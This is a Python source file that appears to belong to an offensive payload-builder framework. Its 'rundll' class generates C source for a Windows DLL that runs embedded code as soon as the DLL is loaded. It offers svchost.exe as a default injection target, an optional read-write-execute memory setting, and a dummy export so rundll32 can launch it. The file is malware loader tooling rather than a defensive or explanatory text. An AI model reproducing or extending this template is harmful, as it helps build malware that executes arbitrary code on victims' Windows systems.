from string import Template

class rundll:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>",
                "#include <stdlib.h>", 
                "#include <winternl.h>",
                "#include <tchar.h>"]

    def compilerOptions(self) -> list[str]:
        return ['-luser32',
                '-shared']

    def template(self) -> str:
        return """
{imports}

{codeblocks}

int executecode(){{
    
    {template}
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        executecode();
    }}
    return TRUE;
}}

__attribute__((dllexport)) void CALLBACK Dummy(HWND hwnd, HINSTANCE h, LPSTR c, int n) {{}}
"""